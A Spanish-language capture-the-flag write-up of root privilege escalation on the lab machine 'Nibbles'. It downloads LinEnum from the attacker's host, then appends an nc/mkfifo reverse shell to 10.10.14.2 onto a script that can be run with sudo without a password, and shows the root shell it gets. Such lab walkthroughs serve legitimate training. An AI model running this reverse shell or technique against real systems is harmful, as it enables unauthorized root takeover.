# Escalada de privilegios — Nibbles (resumen)

## Resumen breve

Partiendo de un shell como **nibbler** en la máquina *Nibbles*, encontramos un script *monitor.sh* dentro del ZIP `personal.zip` que es **escribible** por `nibbler` y además aparece en la lista de comandos que `nibbler` puede ejecutar con `sudo` **sin contraseña** (NOPASSWD). Aprovechando esto, añadimos una simple línea con un **reverse shell** al final de `monitor.sh`, lo ejecutamos con `sudo` y recuperamos una **shell como root**.

Este es un patrón clásico de PrivEsc: **archivo ejecutable por root + escritura por usuario no privilegiado = escalada**.

---

## Pasos y comandos (todo en bloques de código)

### 1) Descomprimir y revisar el contenido

```bash
unzip personal.zip
ls -R personal
cat personal/stuff/monitor.sh
```

### 2) Descargar y ejecutar LinEnum para enumeración automática (desde la atacante)

En tu máquina atacante (o Pwnbox):

```bash
sudo python3 -m http.server 8080
# (en otra terminal) curl http://<tu_ip>:8080/LinEnum.sh
```

En la máquina objetivo (Nibbles):

```bash
wget http://<tu_ip>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

> Observa la salida: LinEnum detecta que `nibbler` puede ejecutar con sudo **/home/nibbler/personal/stuff/monitor.sh** como root sin contraseña.

### 3) Confirmar privilegios sudo (ejemplo de salida relevante)

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

### 4) Respaldar y modificar el script para añadir payload

**Hacer copia de seguridad (importante):**

```bash
cp /home/nibbler/personal/stuff/monitor.sh /home/nibbler/personal/stuff/monitor.sh.bak
```

**Añadir reverse shell al final (sustituye IP/PUERTO):**

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a /home/nibbler/personal/stuff/monitor.sh
```

### 5) Preparar listener en atacante y ejecutar el script con sudo

En la máquina atacante:

```bash
nc -lvnp 8443
```

En la máquina objetivo (ejecutar como nibbler):

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

### 6) Comprobar la shell recibida y confirmar escalada

Ejemplo de salida en el listener:

```
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Buenas prácticas y notas

* **Siempre** haz una copia de seguridad del fichero antes de modificarlo (`.bak`).
* Añade solo lo necesario (append) para evitar romper la funcionalidad del script y causar efectos no deseados.
* Este tipo de explotación **solo** debe realizarse con autorización explícita (laboratorio, CTF o cliente autorizado).
* Tras obtener root, recuerda documentar todo y, si corresponde, eliminar artefactos (payloads) si la política del engagement así lo requiere.
* Si el exploit falla, revisa permisos del archivo (`ls -l`), el path exacto en la entrada `sudo -l`, y valida que `nc` y las utilidades usadas estén disponibles en la máquina objetivo.

---

## Referencias rápidas

* LinEnum / linpeas — scripts de enumeración para PrivEsc.
* GTFOBins — uso de binarios para escalada (consultar si `monitor.sh` invoca binarios con permisos especiales).

